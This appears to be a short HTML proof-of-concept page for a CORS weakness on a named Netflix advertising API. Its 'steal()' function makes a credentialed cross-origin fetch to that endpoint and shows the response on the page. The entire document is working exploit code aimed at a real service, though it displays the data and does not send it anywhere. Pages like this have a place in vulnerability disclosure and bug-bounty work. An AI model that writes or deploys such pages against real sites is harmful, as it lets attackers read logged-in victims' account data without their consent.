<!DOCTYPE html>
<html>
  <body>
    <h1>Netflix CORS PoC</h1>
    <button onclick="steal()">Run</button>
    <pre id="out">Waiting...</pre>
    <script>
      function steal() {
        fetch("https://advertising.netflix.com/api/content/locales", {
          credentials: "include"
        })
          .then(r => r.text())
          .then(t => {
            document.getElementById("out").innerText = t;
          })
          .catch(e => {
            document.getElementById("out").innerText = "Error: " + e;
          });
      }
    </script>
  </body>
</html>
